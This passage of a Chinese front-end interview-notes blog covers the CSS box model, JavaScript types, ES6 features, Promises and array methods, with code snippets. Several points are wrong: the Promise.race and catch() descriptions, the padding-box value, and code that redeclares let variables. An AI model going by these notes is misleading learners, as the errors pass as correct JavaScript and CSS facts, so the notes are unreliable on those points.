强调过渡，是元素的一个或多个属性发生变化时产生的过渡效果，同一个元素通过两个不同的途径获取样式；</li>\n</ul>\n<h3 id=\"5-标准盒模型和怪异盒模型\"><a href=\"#5-标准盒模型和怪异盒模型\" class=\"headerlink\" title=\"5.标准盒模型和怪异盒模型\"></a>5.标准盒模型和怪异盒模型</h3><p>W3C标准盒子模型由：content、margin、padding、border组成；</p>\n<h5 id=\"区别：总宽度的计算公式不一样\"><a href=\"#区别：总宽度的计算公式不一样\" class=\"headerlink\" title=\"区别：总宽度的计算公式不一样\"></a>区别：总宽度的计算公式不一样</h5><p>标准盒模型总宽度=width+margin（左右）+padding（左右）+border（左右）；</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20201224112703410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDgwODQ4Mw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>怪异盒模型总宽度=width+margin（左右）（width已经包含padding和border的值）；</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20201224113002950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDgwODQ4Mw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs css\">    <span class=\"hljs-selector-class\">.box</span> &#123;<br>        <span class=\"hljs-attribute\">margin</span>: <span class=\"hljs-number\">30px</span>;<br>        <span class=\"hljs-attribute\">padding</span>: <span class=\"hljs-number\">20px</span>;<br>        <span class=\"hljs-attribute\">width</span>: <span class=\"hljs-number\">80px</span>;<br>        <span class=\"hljs-attribute\">height</span>: <span class=\"hljs-number\">40px</span>;<br>        <span class=\"hljs-attribute\">border</span>: <span class=\"hljs-number\">10px</span> solid <span class=\"hljs-number\">#00007e</span>;<br>        <span class=\"hljs-attribute\">background</span>: <span class=\"hljs-number\">#fec997</span>;<br>        <span class=\"hljs-attribute\">box-sizing</span>: border-box <span class=\"hljs-comment\">/* 设置盒子类型 */</span><br>      &#125;<br><br><span class=\"hljs-comment\">/*</span><br><span class=\"hljs-comment\">\tcontent-box:标准盒模型；</span><br><span class=\"hljs-comment\">\tborder-box:怪异盒模型；</span><br><span class=\"hljs-comment\">\tpadding-box:盒子宽度等于content+padding;</span><br><span class=\"hljs-comment\">\tinherit:从父元素继承box-sizeing的属性；</span><br><span class=\"hljs-comment\">*/</span><br><br></code></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"三、JS\"><a href=\"#三、JS\" class=\"headerlink\" title=\"三、JS\"></a>三、JS</h2><h3 id=\"1-基本数据类型\"><a href=\"#1-基本数据类型\" class=\"headerlink\" title=\"1.基本数据类型\"></a>1.基本数据类型</h3><ul>\n<li>基本数据类型</li>\n</ul>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs typescript\"><span class=\"hljs-built_in\">number</span>,<span class=\"hljs-built_in\">string</span>,<span class=\"hljs-literal\">undefined</span>,<span class=\"hljs-title class_\">Boolean</span>,<span class=\"hljs-literal\">null</span>;<br><span class=\"hljs-title class_\">ES6</span>添加：<span class=\"hljs-title class_\">Symbol</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>复杂数据类型</li>\n</ul>\n<figure class=\"highlight coffeescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs coffeescript\"><span class=\"hljs-built_in\">Object</span>；<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>0.1+0.2！=0.3</p>\n<p>浮点数值的最高精度事28位小数，0.1+0.2= 0.30000 0000 0000 0004</p>\n<p>基于IEEE754数值的浮点计算通病；</p>\n</blockquote>\n<h3 id=\"2-ES6新特性\"><a href=\"#2-ES6新特性\" class=\"headerlink\" title=\"2.ES6新特性\"></a>2.ES6新特性</h3><blockquote>\n<p>ES6=ES2015</p>\n</blockquote>\n<ul>\n<li>新增块级作用域let,const;</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//let </span><br><span class=\"hljs-keyword\">for</span>(<span class=\"hljs-keyword\">var</span> i=<span class=\"hljs-number\">0</span>;i&lt;<span class=\"hljs-number\">5</span>;i++)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(i);<br>&#125;<br><br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(i+<span class=\"hljs-number\">1</span>);\t\t\t<span class=\"hljs-comment\">//循环体外部能够访问i，使用let不会</span><br><br><span class=\"hljs-comment\">//const声明的是常量，不能被修改；</span><br><span class=\"hljs-keyword\">const</span> a=<span class=\"hljs-number\">1</span>;<br><br><span class=\"hljs-comment\">//const 声明的数组不可以被重新赋值，但是可以修改元素；</span><br><span class=\"hljs-keyword\">const</span> names=[<span class=\"hljs-string\">&quot;A&quot;</span>,<span class=\"hljs-string\">&quot;B&quot;</span>];<br><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>定义类的语法糖；</li>\n<li>新增基本数据类型Symbol；</li>\n<li>新增变量解构赋值；</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//数组</span><br><span class=\"hljs-keyword\">let</span> arr=[<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>]<br><span class=\"hljs-keyword\">const</span> [x,y,z]=arr;<br><br><span class=\"hljs-comment\">//对象</span><br><span class=\"hljs-keyword\">const</span> person=&#123;<br>    <span class=\"hljs-attr\">name</span>:<span class=\"hljs-string\">&quot;Martin&quot;</span>,<br>    <span class=\"hljs-attr\">age</span>:<span class=\"hljs-number\">22</span>,<br>    <span class=\"hljs-attr\">languages</span>:[<span class=\"hljs-string\">&#x27;Java&#x27;</span>,<span class=\"hljs-string\">&#x27;Python&#x27;</span>]<br>&#125;;<br><br><span class=\"hljs-keyword\">const</span> &#123;<span class=\"hljs-attr\">name</span>:n,<span class=\"hljs-attr\">age</span>:a,<span class=\"hljs-attr\">language</span>:l&#125;=person;<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(n,a,l);<br></code></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li>函数参数允许默认值，引入rest参数，新增箭头函数；</li>\n</ul>\n<p><a href=\"https://blog.csdn.net/sinat_41696687/article/details/121903414\">https://blog.csdn.net/sinat_41696687/article/details/121903414</a></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">// =&gt;不只是function的简写，还有其他优点：和包围他的代码公用this，解决了this指向问题；原理是补获上下文的this；</span><br><span class=\"hljs-comment\">//如果箭头函数的外层有普通函数，this指向普通函数的this；</span><br><span class=\"hljs-comment\">//妹有普通函数，this指向全局变量</span><br><span class=\"hljs-comment\">//有</span><br><span class=\"hljs-keyword\">let</span> obj = &#123;<br>  <span class=\"hljs-attr\">fn</span>:<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>      <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;我是普通函数&#x27;</span>,<span class=\"hljs-variable language_\">this</span> === obj)   <span class=\"hljs-comment\">// true</span><br>      <span class=\"hljs-keyword\">return</span> <span class=\"hljs-function\">()=&gt;</span>&#123;<br>          <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;我是箭头函数&#x27;</span>,<span class=\"hljs-variable language_\">this</span> === obj) <span class=\"hljs-comment\">// true</span><br>      &#125;<br>  &#125;<br>&#125;<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(obj.<span class=\"hljs-title function_\">fn</span>()())<br><br><span class=\"hljs-comment\">//妹有</span><br><span class=\"hljs-keyword\">let</span> obj = &#123;<br>    <span class=\"hljs-attr\">fn</span>:<span class=\"hljs-function\">()=&gt;</span>&#123;<br>        <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-variable language_\">this</span> === <span class=\"hljs-variable language_\">window</span>);<br>    &#125;<br>&#125;<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(obj.<span class=\"hljs-title function_\">fn</span>())<br><span class=\"hljs-comment\">// true</span><br><br><span class=\"hljs-comment\">//默认值</span><br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">add</span>(<span class=\"hljs-params\">a,b=<span class=\"hljs-number\">1</span></span>)&#123;<br>    <span class=\"hljs-keyword\">return</span> a+b;<br>&#125;<br><br><span class=\"hljs-comment\">//箭头函数是匿名函数，不能作为构造函数，不可以使用new；</span><br><br><span class=\"hljs-comment\">//箭头函数不绑定arguments,使用rest参数，妹有super和new.target;</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>数组新增API，isArray/from/of,数组实例增加：entries（）,keys(),values（）等方法；</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//字符串拓展</span><br><span class=\"hljs-keyword\">let</span> str = <span class=\"hljs-string\">&quot;hello ReactJS&quot;</span>;<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(str,<span class=\"hljs-string\">&quot;中是否包含ReactJS&quot;</span>,str.<span class=\"hljs-title function_\">includes</span>(<span class=\"hljs-string\">&quot;ReactJS&quot;</span>));<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(str,<span class=\"hljs-string\">&quot;是否以h开头&quot;</span>,str.<span class=\"hljs-title function_\">startsWith</span>(<span class=\"hljs-string\">&quot;h&quot;</span>));<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(str,<span class=\"hljs-string\">&quot;是否以actJS结尾&quot;</span>,str.<span class=\"hljs-title function_\">endsWith</span>(<span class=\"hljs-string\">&quot;actJS&quot;</span>));<br><br><span class=\"hljs-comment\">//字符串模板</span><br><span class=\"hljs-keyword\">let</span> str = <span class=\"hljs-string\">`c</span><br><span class=\"hljs-string\">y</span><br><span class=\"hljs-string\">l`</span>;<br></code></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li>对象和数组新增拓展运算符号；</li>\n<li>新增模块化：import,export;</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">var</span> name=<span class=\"hljs-string\">&#x27;Martin&#x27;</span>;<br><span class=\"hljs-keyword\">export</span> &#123;name&#125;;<br><br><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">MakeLove</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <br>&#125;<br><br><br></code></pre></td></tr></table></figure>\n\n\n\n<ul>\n<li>新增Set()和Map数据结构；</li>\n<li>原生提供Proxy构造函数，用来生成Proxy实例；</li>\n<li>新增生成器<strong>Generater</strong>和<strong>Iterator</strong>；</li>\n</ul>\n<h3 id=\"3-Bigint\"><a href=\"#3-Bigint\" class=\"headerlink\" title=\"3.Bigint\"></a>3.Bigint</h3><blockquote>\n<p>支持任意长度的整数：末尾+n；</p>\n<p>不能混用常规的和Bigint</p>\n</blockquote>\n<h3 id=\"4-Promise-和-Await\"><a href=\"#4-Promise-和-Await\" class=\"headerlink\" title=\"4.Promise 和 Await\"></a>4.Promise 和 Await</h3><p><a href=\"https://es6.ruanyifeng.com/#docs/promise\">https://es6.ruanyifeng.com/#docs/promise</a></p>\n<ul>\n<li>Promise时异步编程的解决方案，比较传统的回调函数和事件更加合理强大；</li>\n<li>一个用来保存某个未来才会结束的事件；</li>\n</ul>\n<blockquote>\n<p>Promise对象有以下两个特点：</p>\n<p>（1）对象的状态不受外界影响，Promise对象代表一个异步操作，有三种状态：</p>\n<p>pending（进行中）、fulfilled（已成功）、rejected（已失败）只有异步操作的结果才能决定状态；</p>\n<p>（2）一旦状态改变，不会再变。Promise对象的状态改变只有：pending-&gt;fulfilled，pending-&gt;rejected</p>\n<p>状态凝固了就是resolved。如果改变已经发生了，再对Promise对象添加回调函数，也会立即得到结果；这与事件不同，事件一旦错过就不再获得结果；</p>\n<p>缺点：</p>\n<p>无法取消Promise，一旦新建就会立即执行，无法中途取消；</p>\n<p>不设置回调函数，Promise内部抛出的错误不会反映到外部；</p>\n<p>当处于pending状态时，无法得知目前进展到哪一个阶段；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//promise构造函数接受一个函数作为参数，该函数的两个参数分别为resolve和reject</span><br><span class=\"hljs-comment\">//resolve函数是将Promise对象的状态从未完成变成成功；pending-&gt;resolved，异步操作成功时调用并将异步操作的结果作为参数传递出去；</span><br><span class=\"hljs-comment\">//reject函数时将promise对象的状态从未完成变成失败，pending-&gt;rejected，异步操作错误时将报错错位参数传递出去；</span><br>promise.<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">valueA</span>)&#123;<br>    <br>&#125;,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">error</span>)&#123;<br>    <br>&#125;)<br><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>promise.prototype.then(参数1，参数2)</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//Promise实例具有then方法，定义在原型对象上，作为Promise实例添加状态改变时的回调函数；</span><br><span class=\"hljs-comment\">//可以采用链式写法</span><br><span class=\"hljs-title function_\">getJSON</span>(<span class=\"hljs-string\">&quot;url&quot;</span>).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>)=&gt;</span>&#123;<br>    <br>&#125;).<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">error</span>)=&gt;</span>&#123;<br>    <br>&#125;)<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>promise.prototype.catch()</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//是then的别名，用于指定发生错误时的回调函数</span><br><span class=\"hljs-title function_\">getJson</span>().<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>)=&gt;</span>&#123;<br>    <br>&#125;).<span class=\"hljs-title function_\">catch</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">error</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(error);<br>&#125;)<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>promise.prototype.finally()</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-title function_\">getJson</span>().<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>)=&gt;</span>&#123;<br>    <br>&#125;).<span class=\"hljs-title function_\">catch</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">error</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(error);<br>&#125;).<span class=\"hljs-title function_\">finally</span>(<span class=\"hljs-function\">()=&gt;</span>&#123;<br>    <span class=\"hljs-comment\">//最后一定执行</span><br>&#125;)<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>promise.all()</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//用于将多个promise实例，包装成一个新的promise实例</span><br><span class=\"hljs-keyword\">const</span> p=<span class=\"hljs-title class_\">Promise</span>.<span class=\"hljs-title function_\">all</span>([p1,p2,p3]);<br><br><span class=\"hljs-comment\">//只有p123的状态都称为fulfiled p才会成功；任一个rejected p也会；</span><br><span class=\"hljs-keyword\">const</span> databasePromise = <span class=\"hljs-title function_\">connectDatabase</span>();<br><br><span class=\"hljs-keyword\">const</span> booksPromise = databasePromise<br>  .<span class=\"hljs-title function_\">then</span>(findAllBooks);<br><br><span class=\"hljs-keyword\">const</span> userPromise = databasePromise<br>  .<span class=\"hljs-title function_\">then</span>(getCurrentUser);<br><br><span class=\"hljs-title class_\">Promise</span>.<span class=\"hljs-title function_\">all</span>([<br>  booksPromise,<br>  userPromise<br>])<br>.<span class=\"hljs-title function_\">then</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">[books, user]</span>) =&gt;</span> <span class=\"hljs-title function_\">pickTopRecommendations</span>(books, user));<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>Promise.race():多个实例任一成功都会返回成功；</li>\n</ul>\n<h3 id=\"5-数组方法\"><a href=\"#5-数组方法\" class=\"headerlink\" title=\"5.数组方法\"></a>5.数组方法</h3><h5 id=\"join-（数组转字符串）\"><a href=\"#join-（数组转字符串）\" class=\"headerlink\" title=\"join() （数组转字符串）\"></a>join() （数组转字符串）</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">var</span> arr = [<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">4</span>]<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr)<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr.<span class=\"hljs-title function_\">join</span>(<span class=\"hljs-string\">&#x27;&#x27;</span>))<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr.<span class=\"hljs-title function_\">join</span>(<span class=\"hljs-string\">&#x27;-&#x27;</span>))<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr)\t<span class=\"hljs-comment\">//原数组不变</span><br><br><span class=\"hljs-comment\">//join实现重复字符串</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">repeateStr</span> (str, n) &#123;<br>  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Array</span>(n + <span class=\"hljs-number\">1</span>).<span class=\"hljs-title function_\">join</span>(str)<br>&#125;<br><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"push-和pop\"><a href=\"#push-和pop\" class=\"headerlink\" title=\"push()和pop()\"></a>push()和pop()</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//push 向数组的末尾添加元素</span><br><span class=\"hljs-comment\">//pop 删除并返回最后一个数组元素</span><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"shift-和unshift\"><a href=\"#shift-和unshift\" class=\"headerlink\" title=\"shift()和unshift()\"></a>shift()和unshift()</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">// shift() 删除数组第一个元素，并返回该元素的值</span><br><span class=\"hljs-comment\">// unshift() 向数组的开头添加一个或多个元素，并返回新的长度</span><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"sort\"><a href=\"#sort\" class=\"headerlink\" title=\"sort()\"></a>sort()</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><br><span class=\"hljs-comment\">// sort() 对数组元素进行排序，并返回当前数组:对字符的排序是按照字母的Unicode码进行排序的</span><br><span class=\"hljs-comment\">// reverse() 颠倒数组中元素的顺序，并返回当前数组</span><br><span class=\"hljs-keyword\">var</span> arr = [<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">100</span>, <span class=\"hljs-number\">20</span>, <span class=\"hljs-number\">30</span>]<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr.<span class=\"hljs-title function_\">sort</span>())<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr.<span class=\"hljs-title function_\">reverse</span>())<br><span class=\"hljs-comment\">//实现数值排序</span><br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr.<span class=\"hljs-title function_\">sort</span>(<span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">a, b</span>) &#123;<br>  <span class=\"hljs-keyword\">return</span> a - b<br>&#125;))<br><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"concat-连接数组\"><a href=\"#concat-连接数组\" class=\"headerlink\" title=\"concat()  (连接数组)\"></a>concat()  (连接数组)</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">// concat() 连接两个或多个数组，并返回新的数组</span><br><span class=\"hljs-comment\">// slice() 选取数组的的一部分，并返回一个新数组</span><br><span class=\"hljs-comment\">// splice() 从数组中添加或删除元素，并返回被删除的元素</span><br><span class=\"hljs-keyword\">var</span> arr = [<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">4</span>, <span class=\"hljs-number\">5</span>]<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr.<span class=\"hljs-title function_\">concat</span>([<span class=\"hljs-number\">6</span>, <span class=\"hljs-number\">7</span>, <span class=\"hljs-number\">8</span>]))<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr.<span class=\"hljs-title function_\">slice</span>(<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">3</span>))<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr.<span class=\"hljs-title function_\">splice</span>(<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">2</span>, <span class=\"hljs-number\">6</span>, <span class=\"hljs-number\">7</span>, <span class=\"hljs-number\">8</span>))<br><br><span class=\"hljs-comment\">//传入二维数组，将其转化为一维数组</span><br><span class=\"hljs-keyword\">var</span> arr1 = [[<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">2</span>], [<span class=\"hljs-number\">3</span>, <span class=\"hljs-number\">4</span>], [<span class=\"hljs-number\">5</span>, <span class=\"hljs-number\">6</span>]]<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(arr.<span class=\"hljs-title function_\">concat</span>(arr1))\t\t<span class=\"hljs-comment\">//讲数组当作元素项合并</span><br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>([].<span class=\"hljs-property\">concat</span>.<span class=\"hljs-title function_\">apply</span>([], arr1))\t\t<span class=\"hljs-comment\">//合并</span><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"slice-start-end\"><a href=\"#slice-start-end\" class=\"headerlink\" title=\"slice(start,end)\"></a>slice(start,end)</h5><p>·ES5新增·</p>\n<h5 id=\"indexOf-lastIndexOf-返回首次出现的位置，无返回-1\"><a href=\"#indexOf-lastIndexOf-返回首次出现的位置，无返回-1\" class=\"headerlink\" title=\"indexOf()  lastIndexOf()  返回首次出现的位置，无返回-1\"></a>indexOf()  lastIndexOf()  返回首次出现的位置，无返回-1</h5><h5 id=\"forEach-map-filter-some-every\"><a href=\"#forEach-map-filter-some-every\" class=\"headerlink\" title=\"forEach() map(),filter(),some(),every();\"></a>forEach() map(),filter(),some(),every();</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span 